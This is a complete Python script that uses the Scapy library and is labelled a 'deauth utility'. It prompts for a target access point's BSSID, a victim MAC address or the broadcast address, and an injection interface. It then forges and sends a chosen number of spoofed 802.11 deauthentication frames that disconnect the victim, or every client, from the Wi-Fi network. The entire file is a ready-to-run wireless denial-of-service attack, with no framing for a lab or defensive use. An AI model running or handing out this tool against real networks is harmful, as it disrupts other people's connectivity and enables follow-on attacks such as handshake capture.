from scapy.all import *
from scapy.layers.dot11 import *

import time
import subprocess
import re

#mac input helper function
def inputMAC():
    mac_regex = r'^[0-9a-fA-F]{2}(:[0-9a-fA-F]{2}){5}$'
    #two hex digits (HH) followed by 5 times (:HH) is a mac
    
    #repeat until proper input
    while True:
        mac_input = input()
        
        #Check regex and length for sanity
        if re.match(mac_regex, mac_input) and len(mac_input) == 17:
            break
        else:
            print("Please enter a valid MAC address.\n")
    
    return mac_input

def inputInt():
    while True:
        try:
            num = int(input())
            if not num > 0:
                raise ValueError("Integer must be greater than zero")
            break
        except:
            print("Input an integer greater than 0.")
    
    return num
            
def inputFloat():
    while True:
        try:
            num = float(input())
            if not num > 0:
                raise ValueError("Floating point number must be greater than zero")
            break
        except:
            print("Input a floating point number greater than 0.")
            
    return num
            
#MAIN --------------------------------------------------------------------------------------------------------
print("DEAUTH UTILITY ----------------------------------------------------")
print("Before using, make sure your network adapter is capable of monitoring and packet injection.")
print("Ensure that drivers are properly installed.\n")


print("Enter BSSID of AP (Access Point) to which the victim is connected.\n")
ac_BSSID = inputMAC()

print("Enter MAC address of victim. (FF:FF:FF:FF:FF:FF for broadcast)\n")
victim_MAC = inputMAC()
#keep track if it's a broadcast.
bc_mode = victim_MAC.lower() == "ff:ff:ff:ff:ff:ff"

print("Enter name of interface you wish to use for injection.")
print("(Please note that the interface must be in monitor mode and capable of packet injection!)\n")
#Might want to check for proper interface input, or mode (subprocess)
net_iface = input()

#as sniffed in Scapy's interpreter, build the deauth packet.
deauth_frame = RadioTap() / Dot11(subtype = 12, type = 0, addr1 = victim_MAC,
                                  addr2 = ac_BSSID, addr3 = ac_BSSID) / Dot11Deauth(reason = 7)

print("Input how many packets you want to send.\n")
frame_count = inputInt()
print("Input delay between deauth frames in seconds.\n")
injection_delay = inputFloat()

print("About to inject " + str(frame_count) + " deauthetication frames as "
      + ac_BSSID + " to " + victim_MAC + (" (broadcast) " if bc_mode else ""))
input("Press enter to continue...")

sendp(deauth_frame, iface = net_iface, count = frame_count, inter = injection_delay)